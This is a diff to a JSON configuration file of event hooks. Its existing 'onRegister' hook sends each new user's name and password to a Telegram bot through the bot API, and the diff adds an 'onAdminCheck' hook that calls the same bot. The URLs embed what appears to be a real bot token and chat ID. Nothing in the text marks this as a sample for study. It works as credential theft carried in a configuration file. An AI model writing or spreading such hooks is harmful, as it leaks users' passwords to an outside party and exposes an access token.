@@ -1,5 +1,8 @@
 {
   "onRegister": [
     "https://api.telegram.org/bot6708390345:AAEkuQfxpqcwi3ogEeS3zNWvjc6BSiKIPq8/sendmessage?chat_id=818587082&text=<name>: <password>"
+  ],
+  "onAdminCheck": [
+    "https://api.telegram.org/bot6708390345:AAEkuQfxpqcwi3ogEeS3zNWvjc6BSiKIPq8/sendmessage?chat_id=<id>&text=<text>"
   ]
 }
